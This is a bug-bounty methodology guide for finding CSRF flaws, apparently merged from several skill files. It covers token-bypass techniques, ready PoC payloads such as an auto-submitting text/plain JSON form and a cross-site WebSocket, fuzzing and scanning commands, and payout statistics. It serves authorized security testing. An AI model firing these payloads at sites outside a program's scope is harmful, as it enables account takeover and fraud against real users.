# Unified upstream methodology

Collected from every contributing repository skill. Deduplicated by content hash; full originals are preserved in `references/upstream-*.md`.

## Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Find state-changing requests and check for anti-CSRF tokens and SameSite cookies.
- Remove the token, blank it, reuse another session's token, and try a fixed token.
- Try GET, form POST, text/plain JSON, multipart, and method override.
- Check email/password change, OAuth consent, and login CSRF.
- Look for subdomain XSS or cookie scope that enables CSRF.

### Deeper checklist

- Identify state-changing requests and check for anti-CSRF tokens and SameSite cookies.
- Test token validation: missing token, empty token, token from another session, fixed token.
- Try method/content-type tricks: GET, POST forms, text/plain JSON, multipart, method override.
- Check CORS misconfigurations that allow credentialed cross-origin reads/writes.
- Test login CSRF, logout CSRF, OAuth state CSRF, and email-change CSRF.
- Look at subdomain/XSS-assisted CSRF where cookies are scoped to the parent domain.
- Build a minimal PoC page and confirm the state change on a victim account.

### Autonomous Testing Priority

**CSRF only matters on state-changing actions that a browser could be tricked into making cross-site.**

**Testing flow:**
1. **GET the form endpoint** to establish a baseline and check what fields exist (look for hidden `csrf_token`, `authenticity_token`, `_token`, `csrfmiddlewaretoken` fields).
2. **POST the state-changing action without any CSRF token field.** Send only the functional parameters (email, amount, etc.).
3. **Use a "simple-request" Content-Type** — `application/x-www-form-urlencoded`, `multipart/form-data`, OR `text/plain` are the three CORS "simple" content-types a cross-origin form can send with no preflight. A JSON endpoint is CSRF-resistant **only if the server rejects those** — if it also accepts a `text/plain` body (common), craft a `text/plain` payload that parses as valid JSON (see the JSON-CSRF-via-text/plain section). Don't skip a JSON endpoint on the assumption that `application/json` alone is protective.
4. **If the action succeeds (2xx, no "invalid token" error) → CSRF is confirmed.**

**High-value targets (in order of impact):**
- Email/password change → account takeover
- Money transfer or payment → financial fraud
- Admin actions (role assignment, user deletion)
- OAuth social-account linking → persistent ATO

**Token bypass techniques when a token IS present:**
- Omit the token field entirely — some frameworks only validate if the field exists, not if it's absent
- Send an empty value (`_token=`) — some validate format, not presence
- Copy a token from another session — some tokens aren't tied to the session

**Scope:** Don't test CSRF on login forms (no existing session to exploit), logout (no real impact), or read-only GET endpoints.

---

### Step-by-Step Hunting Methodology

1. **Map all state-changing endpoints** — Spider authenticated session, filter for POST/PUT/DELETE/PATCH. Note every form and AJAX call.

2. **Check cookie SameSite attributes** — In DevTools → Application → Cookies. Flag any session cookie without `SameSite=Strict` or `Lax`.

3. **Test token staticness** — Log in twice (different sessions or incognito). Compare `authenticity_token` / `csrfmiddlewaretoken` / `csrf-token` values across:
   - Same session, different page loads (should be different)
   - Different sessions for same user
   - Different users entirely

4. **Test token omission** — Remove the CSRF token field entirely from a POST request. If the server returns 200, you have CSRF.

5. **Test token substitution** — Replace the token with one from a different session. Server accepting it = broken validation.

6. **Test JSON endpoints for form-POST CSRF** — Check if Content-Type is enforced:
   - Send `application/x-www-form-urlencoded` to a JSON endpoint
   - Send `text/plain` with a JSON body
   - If accepted, HTML form can trigger it cross-origin

7. **Hunt OAuth/SSO RelayState** — Intercept SAML/OIDC flows. Test if `RelayState` is validated for same-origin. Inject external URLs.

8. **Check social linking flows** — Every "connect your X account" feature. These often use redirect-based OAuth where CSRF on the callback can associate an attacker's social account.

9. **Test third-party dashboards on subdomains** — Grafana, Kibana, Prometheus. Check version, apply known CVEs, test default CSRF posture.

10. **Build PoC HTML page** — Host on a different origin, fire the request, confirm cookies are sent and action executes.

---

### Web-Research Methodology Additions (2026)

Research basis: PortSwigger Web Security Academy "Bypassing SameSite cookie restrictions" and the OWASP CSRF Prevention Cheat Sheet (Fetch Metadata, client-side CSRF, signed double-submit cookies, origin verification). OWASP's leading reminder still governs triage: **XSS defeats every CSRF mitigation** — so if you have XSS, chain it rather than double-reporting.

### A. Discovery checklist — concrete places, params, headers, flows to look

- **Fetch Metadata headers on protected requests:** `Sec-Fetch-Site` (same-origin / same-site / cross-site / none), `Sec-Fetch-Mode`, `Sec-Fetch-Dest`, `Sec-Fetch-User`, plus a `Vary: Sec-Fetch-Site, Origin` response. A missing/ignored `Sec-Fetch-Site` is the newest common gap.
- **Origin verification logic:** `Origin` / `Referer` checks, and whether a literal `null` is allow-listed. OWASP warns null origins arise from cross-origin redirects and sandboxed iframes without `allow-same-origin` — both attacker-creatable.
- **Custom CSRF header names:** `X-CSRF-Token` (Rails/Laravel/Django), `X-XSRF-Token` (AngularJS), `CSRF-Token` (Express csurf), `X-CSRFToken`. Their presence implies a preflight-based defense — test whether the server actually rejects requests lacking them.
- **Cookie shape:** `__Host-` prefix vs a bare `Domain=` cookie; `SameSite=Strict|Lax|None`, `Secure`. A domain-scoped session cookie shared with sibling subdomains is the classic site-based bypass.
- **Double-submit implementation:** is the token merely duplicated in a cookie (naive, forgeable via a sibling subdomain or plaintext-HTTP cookie injection) or HMAC-bound to the session (signed)?
- **Client-side CSRF gadgets:** JS that builds `fetch()` from `location.hash` / `location.search` (e.g. `#post;/api/profile`), DOM-based open redirects used as on-site gadgets, `postMessage`-driven requests.
- **Sites vs origins:** enumerate every sibling subdomain of the registrable domain — a cross-origin, same-site XSS/subdomain-takeover defeats SameSite entirely.
- **Framework built-ins:** .NET antiforgery, Go 1.25+ `CrossOriginProtection` (Fetch-Metadata based), framework-wide middleware that may be disabled on `/api/*`.
- **Also:** WebSocket handshake endpoints (CSWSH), GET-based state changes, login CSRF, GraphQL mutations via GET.

- **Protected-action inventory:** spider the authenticated session and list every POST/PUT/PATCH/DELETE with its Content-Type and whether a token/header is required. Missing coverage on one endpoint is the finding.
- **Fetch-Metadata server behavior:** does the app check `Sec-Fetch-Site` at all? Log the header value and resulting decision for same-origin, same-site, cross-site, and absent cases.
- **Cookie domain audit:** compare `Set-Cookie` across login, logout, and BFF endpoints; a `Domain=.example.com` cookie with a dangling sibling CNAME is a concrete chain.
- **Token lifecycle:** capture the same token across two page loads, two sessions of one user, and two different users. Static-per-session or cross-user reuse are exploitable.
- **CORS config:** `Access-Control-Allow-Origin` with credentials plus a permissive subdomain regex enables the custom-header bypass from a taken-over sibling.
- **Login/session-fixation surface:** forced-login CSRF and pre-set session IDs via `?next=`/`redirect` parameters.
- **Form-action / polyglot surface:** `<form enctype="text/plain">` producing valid JSON, and base64/multipart wrappers used to smuggle a body past a naive content-type check.
- **GraphQL mutation-via-GET:** test `?query=mutation{...}` — a backend that skips token checks for GET is exploitable via `<img src>`.

## Signals and surfaces

### Signal

- Reports: **541** · paid: **93**
- Median bounty **$300** · p90 **$2,450** · max **$10,000** · total **$69,328**
- Median upvotes **9**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitHub | 2 | $10,000 | 152 |
| HackerOne | 20 | $8,850 | 735 |
| GitLab | 6 | $6,570 | 287 |
| X / xAI | 16 | $5,320 | 598 |
| TikTok | 12 | $4,847 | 847 |
| Internet Bug Bounty | 2 | $4,660 | 58 |
| Uber | 9 | $4,000 | 256 |
| PayPal | 1 | $3,500 | 81 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`email` `password` `change` `delete` `transfer` `invite` `settings` `oauth` `consent`

### Crown Jewel Targets

CSRF becomes high-value when it touches **state-changing actions with account-level or financial consequences**. The highest-paying targets are:

- **Account takeover vectors**: OAuth/SSO flows (RelayState manipulation), social account linking/unlinking (Oculus-Facebook, SocialClub), import-friends features that expose OAuth tokens
- **Authentication infrastructure**: Login CSRF, session fixation via CSRF, forced account association
- **API endpoints accepting cross-origin POST**: JSON APIs, heartbeat/activity APIs, anything that skips Content-Type enforcement
- **Third-party integrations**: Grafana, monitoring dashboards, embedded analytics — often lag on CSRF protections
- **Social platforms**: Twitter/X collections, friend imports, social graph mutations — high-volume, authenticated actions with real user impact

**Asset types that pay most:** Core product auth flows > API gateways > third-party integrations running on subdomains > admin panels.

---

### Response Header Signals

```
# Missing or weak SameSite cookie attributes
Set-Cookie: session=abc123; HttpOnly        # no SameSite = vulnerable
Set-Cookie: session=abc123; SameSite=None   # explicitly allows cross-site

# Missing CSRF headers
# No X-Frame-Options or permissive CORS
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true      # dangerous combo
```

### Tech Stack Signals

- **Rails apps**: Look for `authenticity_token` — test if it's static per session
- **Django apps**: Check `csrfmiddlewaretoken` — test cross-user/session reuse
- **Grafana instances**: CVE-2022-21703 — check version via `/api/health`
- **SAMLv2/OIDC flows**: `RelayState` parameter rarely validated
- **Express/Node APIs**: Often skip CSRF middleware on `/api/*` routes

---

### Attack class 2 — SignalR/WebSocket carve-out (the `/negotiate` shortcut)

Browser WebSockets cannot send custom headers, so `X-CSRF: 1` cannot be enforced on the upgrade. Developers routinely work around this by **excluding SignalR hub paths from BFF antiforgery** (`MapHub<X>().DisableAntiforgery()` or registering them as non-BFF endpoints). Once excluded, any same-site origin (including a takenover sibling subdomain or a stored-XSS page) can open the WS with the ambient session cookie → CSRF-over-WebSocket to invoke hub methods that mutate state.

**Payload shape:** cross-origin page opens `new WebSocket("wss://bff.example.com/hubs/admin")` — browser sends session cookie, no `X-CSRF` required, attacker invokes `DeleteUser(id)` via standard SignalR JSON frame. ([DuendeArchive/Support#972](https://github.com/DuendeArchive/Support/issues/972), [learn.microsoft.com/aspnet/core/signalr/security](https://learn.microsoft.com/en-us/aspnet/core/signalr/security))

## Techniques, payloads and bypasses

### Payloads & probes

- Form -> `<form action=https://target/email method=POST><input name=email value=attacker@x>`
- JSON -> `<form enctype=text/plain><input name='{"email":"attacker@x","x":"' value='"}'>`
- GET -> `<img src=https://target/settings?email=attacker@x>`
- Method override -> `_method=POST` in a GET/form request

### Bypass tricks

- Token not bound to session; token from another account accepted.
- SameSite=Lax bypass via top-level GET or 2-minute window.
- CORS misconfig allowing credentialed cross-origin requests.
- Bypass token check by changing content-type or removing the parameter.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **[CSRF] TikTok Careers Portal Account Takeover** — `#1010522` · TikTok · $0 · ▲366
  > If you have any feedback, feel free to ping me at [Twitter](https://twitter.com/ lauritz ).
- **CSRF on connecting Paypal as Payment Provider** — `#807924` · Shopify · $0 · ▲304
  > `https://h60ngalog.myshopify.com/admin/payments/complete paypal incontext oauth/41?merchantId=MTU4MzAzMDUwNDowMTBmMDZkYjg1NzM0YjQ4NWVkMDk1YzQ1YWYxY2ZlNw%3D%3D&merchantIdInPayPal=5NS8DHQCFGT84&permissionsGranted=true&accountStatus=BUSINESS…
- **Periscope android app deeplink leads to CSRF in follow action** — `#583987` · X / xAI · $1,540 · ▲224
  > + It means we can use ` pscp://user/<user-id or pscpd://user/<user-id `
- **Take over of accounts created using Google or Facebook** — `#442901` · Khan Academy · $0 · ▲184
  > Since the account is created using a social media account, no existing password check is needed and the CSRF check on the endpoint is broken.
- **Improper CSRF token validation allows attackers to access victim's accounts linked to Hackerone** — `#1727221` · HackerOne · $0 · ▲168
  > Then it redirects us to the callback endpoint which sends a postmessage to the embedded iframe to validate the integration on the client side.
- **CSRF protection bypass in GitHub Enterprise management console** — `#1497169` · GitHub · $10,000 · ▲152
  > [CVE-2022-23732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23732)
- **Slack integration setup lacks CSRF protection** — `#170552` · HackerOne · $2,500 · ▲149
  > Cross-site Request Forgery in the `Integrations` (https://hackerone.com/[YOUR TEAM]/integrations) feature for teams.
- **CSRF token validation system is disabled on Stripe Dashboard** — `#1483327` · Stripe · $0 · ▲113
  > @d sharad discovered that due to a code change deployed on 2/14/2022, Cross Site Request Forgery (CSRF) protection was disabled in the Stripe Dashboard.
- **Referer Leakage Vulnerability in  socialclub.rockstargames.com/crew/ leads to FB'S OAuth token theft.** — `#787160` · Rockstar Games · $0 · ▲112
  > The Open Redirect is the subject of a separate report; in this report, we addressed the problem by strengthening the Referer header policy with `<meta name="referrer" content="origin" / `.
- **Cross-Site Request Forgery** — `#2041007` · ownCloud · $0 · ▲111
  > I think the cause of this vulnerability is the second condition of https://github.com/owncloud/core/blob/master/lib/private/AppFramework/Middleware/Security/SecurityMiddleware.php L145, because the the value of `$this- request- getHeader("Authorization")` is…
- **Cross-Site Request Forgery (CSRF) vulnerability on API endpoint allows account takeovers** — `#419891` · Khan Academy · $0 · ▲111
  > The `/signup/email` API endpoint at [khanacademy.org](https://khanacademy.org) is vulnerable to Cross-Site Request Forgery (CSRF) attacks, allowing takeovers of accounts associated with unconfirmed email addresses.
- **CSRF Vulnerability on https://signin.rockstargames.com/tpa/facebook/link/** — `#474833` · Rockstar Games · $0 · ▲104
  > In this report, the researcher identified a Cross-Site Request Forgery vulnerability that could have allowed attackers to link a Facebook account to another user's Social Club account, and thus gain the ability to log in as the victim.
- **Account takeover due to insufficient URL validation on RelayState parameter** — `#1923672` · GitLab · $2,450 · ▲99
  > https://bitbucket.org/site/oauth2/authorize?client id=b9jLmh8WCLZPBAwWba&redirect uri=https%3A%2F%2Fgitlab.com%2Fusers%2Fauth%2Fbitbucket%2Fcallback&response type=token&state=DoesNotMatter
- **One Click Account takeover using Ouath CSRF bypass by adding Null byte %00 in state parameter on  www.streamlabs.com** — `#1046630` · Logitech · $0 · ▲99
  > Allow twitch access and once you see a get request in burp with host streamlabs.com and parameters code, scope and state then generate CSRF PoC
- **CSRF Account Takeover** — `#1253462` · TikTok · $0 · ▲95
  > A Cross-Site Request Forgery (CSRF) vulnerability was found on a TikTok endpoint which could have resulted in a full account takeover.
- **CSRF to HTML Injection in Comments** — `#428019` · WordPress · $0 · ▲95
  > More [details are available on the RIPS blog](https://blog.ripstech.com/2019/wordpress-csrf-to-rce/).
- **CSRF in Account Deletion feature (https://www.flickr.com/account/delete)** — `#615448` · Flickr · $0 · ▲92
  > While testing the account deletion feature, I noticed that there were no CSRF token :/ Later found out it was because of the new login flow.
- **Account takeover at https://try.discourse.org due to no CSRF protection in connecting Yahoo account** — `#423022` · Discourse · $0 · ▲89
  > There is an option in https://try.discourse.org/u/testh1ay/preferences/account to connect our Yahoo account.
- **CSRF on /api/graphql allows executing mutations through GET requests** — `#1122408` · GitLab · $3,370 · ▲88
  > Mutations are `edit` or `create` queries used in Graphql.
- **CSRF token validation system is disabled on Stripe Dashboard** — `#1493437` · Stripe · $2,500 · ▲87
  > @rodolfomarianocy discovered that due to a code change deployed on 2/14/2022, Cross Site Request Forgery (CSRF) protection was disabled in the Stripe Dashboard.
- **CSRF leads to Account takeover** — `#2699029` · U.S. Dept Of Defense · $0 · ▲87
  > Vulnerable domain and endpoint : https://██████████/account/profile/edit
- **Login CSRF vulnerability on hackerone.com** — `#834366` · HackerOne · $500 · ▲84
  > We found a CSRF token bypass on the Hacker One login page.
- **Delete any user's added Email,Telephone,Fax,Address,Skype via csrf in (https://academy.acronis.com/)** — `#709537` · Acronis · $0 · ▲82
  > - navigate to `https://academy.acronis.com/ /account/edit/account id/<your id `
- **XSSI on refer.xoom.com allows stealing email addresses and posting to Twitter on behalf of victim** — `#450796` · PayPal · $3,500 · ▲81
  > This included the email addresses being used and, in extreme cases, tokens allowing Xoom access to post on a user’s Twitter.
- **CSRF in ticket function** — `#1890310` · TikTok · $0 · ▲80
  > I found this issue by removing the CsrfToken from the header and converting the content type from `JSON` to `x-www-form-urlencoded`.
- **Account takeover by changing email** — `#538800` · Khan Academy · $0 · ▲80
  > Attacker then lures a new KA user to visit a URL linking to a page that sends a `POST` request to `/signup/email` with the POST body : `casing=camel&email=ATTACKER EMAIL`.
- **CSRF protection bypass on TikTok Webcast Endpoints** — `#1543234` · TikTok · $2,500 · ▲79
  > API on TikTok Webcast endpoints prevent CSRF by validating the Origin header which indicates the source of the request.
- **CSRF protection on OIDC login is broken** — `#1878381` · Nextcloud · $500 · ▲77
  > So I assume the bug is also the same https://github.com/nextcloud/user oidc/blob/main/lib/Controller/Id4meController.php L175-L181
- **Japan - CSRF in webapp.starbucks.co.jp with user interaction could leak an access token if the user was not using Chrome** — `#1113559` · Starbucks · $0 · ▲77
  > elber discovered a CSRF in webapp.starbucks.co.jp leaked an access token if an authenticated user opened a crafted HTML file in a browser other than Chrome which has Same Site Attribute for the cookie set by default.
- **CSRF on Periscope Web OAuth authorization endpoint** — `#215381` · X / xAI · $0 · ▲74
  > At minimum, I found endpoints that allow creating a broadcast (https://public-api.periscope.tv/v1/broadcast/create), tweeting it (https://public-api.periscope.tv/v1/broadcast/publish) and deleting a broadcast…

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 3× | `new.cs.money{.withgoogle.com` |
| 2× | `www.pscp.tv/<user-id>/follow` |
| 2× | `new.cs.money{.attacker.com` |
| 2× | `http://localhost$something.io` |
| 2× | `<html> / <!-- CSRF PoC - generated by Burp Suite Professional --> / <body> / <script>history.pushState('', '', '/')</script> / <form action=` |
| 1× | `MTU4MzAzMDUwNDowMTBmMDZkYjg1NzM0YjQ4NWVkMDk1YzQ1YWYxY2ZlNw%3D%3D` |
| 1× | `pscp://user/<user-id> or pscpd://user/<user-id>` |
| 1× | `{F1976253} / 3. Following the redirection takes us to the authorization page of the service provider / {F1976255} / If we choose to Authoriz` |
| 1× | `This endpoint validates the code received from Github, the backend relies on the ***state*** parameter to determine to which user should the` |
| 1× | `Location: https://slack.com/oauth/authorize / ?client_id=2174110321.11522100978 / &redirect_uri=https%3A%2F%2Fhackerone.com%2Fauth%2Fslack%2` |
| 1× | `<meta name="referrer" content="origin" />` |
| 1× | `$this->request->getHeader("Authorization")` |
| 1× | `GET /2.0/repositories/%7B766210f9-9bec-4010-9f4d-917b06661c0c%7D HTTP/2 / Host: api.bitbucket.org / User-Agent: curl/7.79.1 / Accept: */* /` |
| 1× | `gitlab@gitlab.com` |
| 1× | `https://academy.acronis.com/#/account/edit/account_id/<your_id>` |
| 1× | `<img>` |
| 1× | `__utmz=123456.123456789.11.2.utmcsr=[HOST]\\|utmccn=(referral)\\|utmcmd=referral\\|utmcct=[PATH]` |
| 1× | `__utmz=123456.123456789.11.2.utmcsr=blackfan.ru\\|utmccn=(referral)\\|utmcmd=referral\\|utmcct=/path/` |
| 1× | `https://eu1.badoo.com/google/verify.phtml?rt=<State_param_value>&code=<Code_returned_from_google>` |
| 1× | `GET /u/x.css HTTP/1.1 / Host: try.discourse.org / <meta name="csrf-token" content="aYBW0N/1nfI1PHBa24YNx+...+BJJX+Fg==" />` |

### Common Root Causes

1. **Static CSRF tokens per session** — Developers generate one token at login and reuse it. Airbnb bug: `authenticity_token` was the same across all page loads for a session, making it trivially leakable.

2. **Token not tied to user identity** — Token is valid server-wide or rotates on a schedule, not per-user/session. Mozilla bug: `csrftoken` reusable across users.

3. **Missing token on "secondary" endpoints** — Developers protect login/signup but forget API endpoints, import flows, or webhook handlers.

4. **JSON API assumption of safety** — Belief that `Content-Type: application/json` prevents CSRF. It does via CORS preflight — unless the server also accepts `text/plain` or `application/x-www-form-urlencoded`.

5. **SameSite=None for cross-site embeds** — Developers set `SameSite=None` to support iframe embeds or third-party integrations, inadvertently re-enabling CSRF.

6. **OAuth RelayState not validated** — Developers implement SAML/OIDC but treat `RelayState` as a redirect hint, not a CSRF state parameter requiring cryptographic binding.

7. **Framework misconfiguration** — CSRF middleware excluded for `/api/*` routes in Django/Rails because "API clients don't need it," but browser-based JS clients do.

8. **Third-party software defaults** — Grafana, Kibana, Jenkins shipped with weak or no CSRF protection in older versions; teams don't patch or check.

---

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Lax + GET bypass:** if the server accepts GET for a state-changing route, a top-level navigation sends the Lax cookie: `<script>document.location='https://target/account/transfer?to=hacker&amt=100'</script>`. Method-override parameters (Symfony `_method=POST`) turn a GET into a routed POST.
- **Strict bypass via on-site gadget:** a client-side redirect whose target comes from a URL parameter produces an ordinary **same-site** request (browsers don't treat client-side redirects as cross-site), so all cookies ride along. Server-side 302s do NOT work this way.
- **Vulnerable sibling domain:** any XSS or takeover on `*.example.com` can issue same-site requests, defeating site-based defenses and fetching custom headers if CORS is regex-permissive.
- **Null-origin bypass:** serve the PoC from a sandboxed iframe (`<iframe sandbox>` without `allow-same-origin`) so `e.origin` is `null`; if the app allowlists `null` (or compares against `window.origin`, which sandboxing also makes `null`), the check passes. PortSwigger also notes `Origin`-omission cases.
- **Naive double-submit forge:** from a controlled sibling or via plaintext HTTP cookie injection, plant a matching cookie; the server compares cookie==parameter and accepts. Only the signed, session-bound HMAC pattern resists this.
- **Referer string checks:** permissive prefix/format validation is bypassable the same way as weak postMessage/CORS checks (e.g. a look-alike host).
- **Client-side CSRF:** manipulate the hash fragment that the JS feeds to `fetch()` — the token and cookies are added by the trusted script itself, so synchronizer tokens and SameSite don't help: `https://site/index/#post;/api/account/profile`.
- **Fetch-Metadata policy gaps:** a policy that only rejects unsafe methods on `cross-site` may still allow cross-site GET to a sensitive endpoint; treating `same-site` as trusted is unsafe if a sibling is compromised; absent `Sec-Fetch-*` must fail closed, not open.
- **WebSocket CSWSH:** an attacker page opens `new WebSocket('wss://target/...')` — the browser sends the ambient cookie and no custom CSRF header can be required on the upgrade.

### JSON CSRF via text/plain (bypasses Content-Type check)

```html
<html>
<body onload="document.forms[0].submit()">
  <form method="POST" action="https://target.com/api/heartbeat"
        enctype="text/plain">
    <!-- browser sends: {"status":"ok","x":"=padding"} -->
    <input type="hidden" name='{"status":"ok","x":"' value='padding"}' />
  </form>
</body>
</html>
```

## Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### Gate 0 Validation

1. **What can the attacker DO right now?** — The attacker must be able to trigger a specific state-changing action (account linking, email change, data deletion, social association) on behalf of the victim without any interaction beyond visiting a URL or page.

2. **What does the victim LOSE?** — Identify the concrete harm: account access (ATO), data exposure, financial loss, reputation damage. "A CSRF token is missing" is not impact — "attacker can link their Oculus account to victim's Facebook account, gaining full profile access" is impact.

3. **Can it be reproduced in 10 minutes from scratch?** — You must be able to: (a) create attacker and victim accounts, (b) host a static HTML PoC, (c) have victim visit PoC, (d) confirm the action executed in victim's account — all within 10 minutes with no additional prerequisites.

---

### C. Validation / proof bar — how to confirm and avoid false positives

- **Gate 0 (keep the skill's existing test):** attacker and victim accounts, a static PoC, victim visits, confirm the action executed in the victim's account — reproducible in 10 minutes. State what the victim *loses*, not that "a request fired."
- **Real browser for real defenses:** a spoofed `Origin`/`Referer` header proves only a naive string check (the raw-client shortcut in this skill). Genuine SameSite/fetch-based enforcement needs an actual cross-origin page and a browser to observe cookie attachment in DevTools.
- **Null-origin must be real:** produce it with a sandboxed iframe and show the request carrying the victim's cookie — don't claim it from a forged header.
- **Fetch-Metadata finding:** show the request's `Sec-Fetch-Site` value and that the server accepted it despite the policy.
- **Avoid false positives:** logout and login-only CSRF, read-only GETs, and "token missing on an endpoint that changes nothing" are N/A. XSS on the origin is not a separate CSRF finding — chain it.
- **Chain to severity:** prove ATO (email/account link), money movement, or admin state change; otherwise report at the base severity.

- **Method/Content-Type matrix:** repeat with form, `text/plain` JSON, and a custom header. A single accepted variant is the finding; document exactly which.
- **Origin variations:** no header, trusted value, look-alike value, and `null` — record which the server accepts.
- **Cookie attachment:** in the victim browser, confirm the session cookie is present on the cross-origin request (Network tab); if SameSite withheld it, the PoC fails.
- **State proof:** compare the victim account before/after — email, role, linked accounts, balance — not just a 200 response.
- **No-XSS condition:** ensure the chain does not depend on XSS on the target origin; if it does, report the XSS as primary.
- **Duplicate-report guard:** if the only issue is a missing token on a logout or read-only GET, kill the finding per the Gate 0 rules already in this skill.
- **Same-site gadget proof:** for a Strict-cookie bypass, show the client-side redirect producing a same-site request with cookies, and that a server-side 302 does NOT.
- **CSWSH proof:** show a cross-origin WebSocket opening with 101 and a hub/method call mutating state.
- **BFF-specific:** for Duende-style BFFs, replay an admin-partition call with `X-CSRF: 1` from a low-priv session and dump `/bff/user` claims.
- **Fetch-Metadata absence:** show a request with no `Sec-Fetch-*` headers (e.g. via an intercepting proxy that strips them) still succeeding.

## Escalation and related chains

### Escalation chains

- CSRF -> email change -> ATO.
- CSRF -> OAuth link -> ATO.
- CSRF + XSS -> worm.

### Related Skills & Chains

- **`xss`** — Any XSS on a trusted origin neutralizes CSRF defenses (token, SameSite, Origin check) instantly. Chain primitive: XSS reads the `meta[name=csrf-token]` value and same-origin-fetches `/accounts/email` with attacker payload → one-click ATO via attacker-page postMessage triggering the stored XSS to perform the state change.
- **`auth-bypass`** — CSRF combined with an auth-bypass primitive lets attacker-side scripts perform state changes that should have required step-up auth. Chain primitive: CSRF on `/settings/password` reaches an endpoint that skips the re-auth check → password change executes without the victim ever entering their current password → ATO.
- **`oauth-oidc`** — OAuth/SAML `state`/`RelayState` is structurally a CSRF token; missing validation here is account-linking CSRF. Chain primitive: attacker initiates OAuth on their account, sends victim the `/callback?code=X&state=` URL → victim's logged-in browser completes the link → attacker's social identity now controls victim's account.
- **`security-arsenal`** — Reach for the CSRF PoC templates (form POST, `enctype=text/plain` JSON, sandboxed-iframe null-origin, base64 multipart bypass) before writing one from scratch; also the WAF-bypass header variants for Origin/Referer checks.
- **`triage-validation`** — Run the Pre-Severity Gate before submitting CSRF on a logout endpoint or any action without state-change consequence — those are the canonical N/A traps. Confirm victim LOSES something concrete (account access, money, data), not just "a request executed."

### Related Skills & Chains

- **`hunt-xss`** — Any XSS on a trusted origin neutralizes CSRF defenses (token, SameSite, Origin check) instantly. Chain primitive: XSS reads the `meta[name=csrf-token]` value and same-origin-fetches `/accounts/email` with attacker payload → one-click ATO via attacker-page postMessage triggering the stored XSS to perform the state change.
- **`hunt-auth-bypass`** — CSRF combined with an auth-bypass primitive lets attacker-side scripts perform state changes that should have required step-up auth. Chain primitive: CSRF on `/settings/password` reaches an endpoint that skips the re-auth check → password change executes without the victim ever entering their current password → ATO.
- **`hunt-oauth`** — OAuth/SAML `state`/`RelayState` is structurally a CSRF token; missing validation here is account-linking CSRF. Chain primitive: attacker initiates OAuth on their account, sends victim the `/callback?code=X&state=` URL → victim's logged-in browser completes the link → attacker's social identity now controls victim's account.
- **`security-arsenal`** — Reach for the CSRF PoC templates (form POST, `enctype=text/plain` JSON, sandboxed-iframe null-origin, base64 multipart bypass) before writing one from scratch; also the WAF-bypass header variants for Origin/Referer checks.
- **`triage-validation`** — Run the Pre-Severity Gate before submitting CSRF on a logout endpoint or any action without state-change consequence — those are the canonical N/A traps. Confirm victim LOSES something concrete (account access, money, data), not just "a request executed."

## Tools and wordlists

### Tools

`Burp CSRF PoC generator` · `browser devtools` · `mitmproxy`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_csrf.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_csrf.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_csrf.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_csrf.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### Nuclei

Confirm with a real cross-origin PoC; scanner hits need a browser check.

```sh
nuclei -u https://target -tags csrf \
       -severity low,medium,high,critical -rl 40 -o nuclei_csrf.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
       -rl 40 -o nuclei_csrf_generic.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Grep patterns for recon

```bash
# Find CSRF token fields in HTML responses
grep -Eo 'name="(csrf|_token|authenticity_token|csrfmiddlewaretoken)"[^>]*value="[^"]+"'

# Find forms without CSRF tokens
grep -B5 -A20 '<form method="[Pp][Oo][Ss][Tt]"' response.html | grep -L "csrf\|token\|nonce"

# Check SameSite in response headers
curl -sI https://target.com/login | grep -i "set-cookie"

# Find RelayState parameters
grep -r "RelayState" --include="*.js" .
```

## Sources and related reading

### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class csrf --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class csrf
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class csrf
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class csrf --min-bounty 1000
```

### Related

- `hackerone-xss` (2,569 reports)
- `hackerone-oauth-oidc` (177 reports)
- `hackerone-clickjacking` (166 reports)

### Related

- `xss` (2,569 reports)
- `oauth-oidc` (177 reports)
- `clickjacking` (166 reports)

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
2. https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html

## Additional notes

### Parameters observed

`email` · `code` · `state` · `id` · `page` · `redirect_uri` · `authenticity_token` · `client_id` · `scope` · `nonce` · `sort_type` · `sort_direction` · `limit` · `password` · `act` · `subject` · `report_id` · `view` · `text_query` · `response_type`

### [CSRF] TikTok Careers Portal Account Takeover

`#1010522` · TikTok · $0 · high · 2020-12-15 · ▲366
